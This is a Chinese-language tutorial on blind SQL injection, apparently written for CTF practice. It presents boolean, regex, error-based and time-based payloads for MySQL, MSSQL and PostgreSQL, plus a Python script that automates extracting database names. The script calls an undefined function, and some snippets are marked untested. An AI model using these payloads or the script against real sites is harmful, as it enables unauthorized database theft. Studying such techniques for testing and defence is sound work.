# SQL注入总结(二)

参考：BUUCTF-Sqli_Labs/ [SQL注入天书](https://xz.aliyun.com/t/385#toc-10)  
非常好的SQL注入文章，本文只是对它的拙劣总结  
想掌握注入，实战永远比理论重要。  
$ 在文章中代表可控变量  
要求读者掌握基本的SQL语法知识  
[堆叠注入和神奇的存储过程绕过](https://blog.csdn.net/weixin_40871137/article/details/94349532)  
[SQLMap的使用](https://www.freebuf.com/sectool/164608.html)

## 盲注

+ 基于布尔的盲注
+ 基于报错的盲注
+ 基于时间的盲注

### 字符串截取函数

#### 1. MID(column_name,start[,length])  

column_name:要提取的字段名字  
start:开始的位置，注意sql是从1开始，不是0  
length:返回多少个字符，省略则返回所有  

举例：`MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>’a’`

#### 2. Substr()和substring()

两者和MID函数用法是一样的。  
substring(string, start, length)

#### 3. Left (string,n)

得到字符串左部指定个数的字符。

#### 附注

+ ORD()函数  
此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用  
例如 ORD(MID(DATABASE(),1,1))>114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’
+ Ascii()函数  
将某个字符转换为ascii值  
例如 ascii(substr((select database()),1,1))=98

[详细介绍链接](https://www.cnblogs.com/lcamry/p/5504374.html)

### 正则表达式注入

select user() regexp '^[a-z]'，匹配会返回1，否则返回0。  

#### 应用方法

+ 通过表达式范围的缩小一步步确定表名。expression like this: '^n[a-z]' -> '^ne[a-z]' -> '^new[a-z]' -> '^news[a-z]' -> FALSE

下面这种写法是SQL中的三目运算符：  
`select * from users where id=1 and 1=(if((user() regexp '...'),1,0))`  
这样写更简单一些：  
`select * from users where id=1 and 1=(user() regexp'...')`  
一个具体的例子

```sql
select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema='xxxxx' and table_name regexp '^us[a-z]' limit 0,1)
```

+ 注意：在limit 0,1下，regexp会匹配所有的项。使用regexp时，要注意可能有多个项，要一个个字符去爆破。limit是作用于select的，不是作用于regexp的！

#### MSSQL的注意事项

%号表示匹配任何长度的字串，_表示匹配一个任意字串。

+ MSSQL使用的并不是标准正则表达式，使用like关键字。

```sql
?id=1 AND 1=(SELECT TOP 1 1 FROM information_schema.tables WHERE TABLE_SCHEMA="blind_sqli" and table_name LIKE '[a-z]%' )
```

select top x :查询前x行的数据。

+ 不能像mysql一样用limit(x,1)，只能使用 table_name not in (select top x table_name from information_schema.tables) 意义是：表名没有在前x行里，其实查询的就是第x+1行

[详细介绍链接](http://www.cnblogs.com/lcamry/articles/5717442.html)

### 布尔盲注

原理很简单，自己写一段脚本代码就会了。  
进阶要求：猜解的时候使用二分搜索  

```python
import requests

charset = ",{{}}abcdefghijklmnopqrstuvwxyz.!@$%^*():/1234567890_#"
url = ["","",""]
SuccessKey = ""

#读取输入
def init():
    print("自动布尔盲注脚本，需要输入URL，payload位置和成功页面特点。")
    print("请输入待测试URL，其中payload使用$来标识。")
    print("例如：http://www.test.com/?id=1' and $%23")
    print("请确保手动注入测试成功，再使用脚本爆破。")
    while True:
        url[0] = input(">url = ")
        if '$' not in url[0]:
            print("没有指出payload的位置。")
            continue
        else:
            break
    url[1],url[2] = url[0].split("$")
    global SuccessKey
    print("接下来输入页面成功的标识，请确保这个字串是唯一的。")
    SuccessKey = input(">SuccessKey = ")

#要在其他函数之前测试一下连接。
def TestConn():
    flags = [False,False,False]
    def TestConnSucc():
        try:
            resp = requests.get(url[1]+"1=1"+url[2])
            return resp
        except Exception as e:
            print(e)
            return None
    def TestConnFail():
        try:
            resp = requests.get(url[1]+"1=2"+url[2])
            return resp
        except Exception as e:
            print(e)
            return None

    RespSucc = TestConnSucc()
    RespFail = TestConnFail()

    if RespFail is None or RespSucc is None:
        print("不能建立与url的连接！")
        flags[0] = False
    else:
        flags[0] = True

    if SuccessKey in RespSucc.text:
        print("成功条件测试成功")
        flags[1] = True

    if SuccessKey not in RespFail.text:
        print("失败条件测试成功")
        flags[2] = True
    else:
        print("失败和成功判断是一样的！请修改识别的关键字")
        print(SuccessKey)

    return flags[0] and flags[1] and flags[2]

#测试payload使得返回的值是真是假
def TestPayload(payload):
    test_url = (url[1]+payload+url[2])
    resp = requests.get(test_url)
    if SuccessKey in resp.text:
        return True
    else:
        return False
#获取所有数据库
def getDatabases(maxlen=30):
    global charset
    get_len_payload = ("length(select group_concat(schema_name) from information_schema.schemata)=")
    get_name_payload = ("left((select group_concat(schema_name) from information_schema.schemata),$)=")
    length = 1
    while length < maxlen:
        if TestPayload(get_len_payload+str(length)) is True:
            break
        else:
            length += 1
    if length == maxlen:
        print("数据库总名称太长，或者程序出现错误了。")
    print("所有数据库名和逗号的总长度："+str(length))

    name = ""
    payl = get_name_payload.split("$")
    for i in range(1,length+1):
        for j in charset:
            if j is '#':
                print("数据库的名字不在字符集中！")
                exit(0)
            full_payload = payl[0]+str(i)+payl[1]+"'"+name+j+"'"
            print(full_payload)
            if TestPayload(full_payload) is True:
                name += j
                break
        print("names: "+name)
    return name.split(",")

def __main__():
    init()
    if TestConn():
        getCurrentDatabaseName()
        #getDatabases()
        #tbl = getTables("ctftraining")
        #getColumns("ctftraining","flag")
        #getrows("ctftraining","flag","flag")
if __name__ == "__main__":
    __main__()
```

脚本只展示了一个函数，其他函数思想类似。

### 报错盲注

构造payload让信息通过错误提示回显出来。

+ group by报错
+ exp报错
+ bigint溢出报错
+ updatexml报错
+ mysql重复特性报错

#### 1. group by

报错原理：插入时主键不唯一。group by子句会对后面的表达式运行两次，如果使用floor+rand（0）产生的有规律序列，很有可能在下一次运行的第二次运算时候产生一个相同的主键，并将这个相同的主键插入，引起错误。  
[详细解释链接](https://blog.csdn.net/he_and/article/details/80455884)

构造语句的方法
【payload】为你想要输出的字段。比如：SELECT schema_name FROM information_schema.schemata limit 0,1  
下面这个比较稳定

```sql
and (select 1 from (select count(*),concat((【payload】),floor (rand(0)*2))x from information_schema.tables group by x)a)
```

---
这些还没有测试成功  
可以简化为

```sql
select count(*) from information_schema.tables group by concat(【payload】,floor(rand(0)*2))
```

如果关键的表被禁用了，可以使用这种形式

```sql
select count(*) from (select 1 union select null union select !1) group by concat(【payload】,floor(rand(0)*2))
```

(需要理解group by报错的原理)如果rand被禁用了，可以使用用户变量。用户变量需要用@变量名来表示，并且使用:=来进行赋值。这里使用min这个聚集函数是因为它可以给用户变量@a赋一个初值。

```sql
select min(@a:=1) from information_schema.tables group by concat(【payload】,(@a:=(@a+1)%2)
```
---
#### 2. exp、bigint溢出

exp 报错原理：exp函数输入一个过大的数值就会发生溢出错误。  
一个查询成功返回，其返回值为0。在sql中对0进行按位取反（即～0）会得到最大的bigint值，这个值输入到exp函数中一定会报错的。

```sql
mysql> select exp(710);
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(710)'
```

因此可以构造`select exp(~(select * FROM(【payload】)a))`一类语句，利用错误回显出需要的数据。  
[详细原理链接](https://www.cnblogs.com/lcamry/articles/5509124.html)

bigint同理。只不过一般不用加法来造成溢出，使用另一种方式，转换为减法。  
`select username, password from users where id='1' or !(select*from(【payload】)x)-~0;`  
[详细原理和利用方法](https://www.cnblogs.com/lcamry/articles/5509112.html)

#### 3. updatexml 和 重复特性

利用了xpath语法错误  
`updatexml(1,concat(0x7e,(select @@version),0x7e),1)`  
利用了重复特性，重复了version  
`select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;`

### 时间盲注

和布尔盲注一个道理，只不过这里判断是否成功的依据变成了返回的时间。

```sql
--可以使用sleep函数
If(ascii(substr(database(),1,1))>115,0,sleep(5))%23  
--另一种函数用法
UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),
BENCHMARK(5000000,ENCODE(‘MSG’,’by 5 seconds’)),null)
 FROM (select database() as current) as tb1;
```

BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的cpu资源。推荐使用sleep()。

>Mysql：BENCHMARK(100000,MD5(1)) or sleep(5)  
Postgresql：PG_SLEEP(5) OR GENERATE_SERIES(1,10000)  
Ms sql server：WAITFOR DELAY ‘0:0:5’  

来自白帽子讲web安全
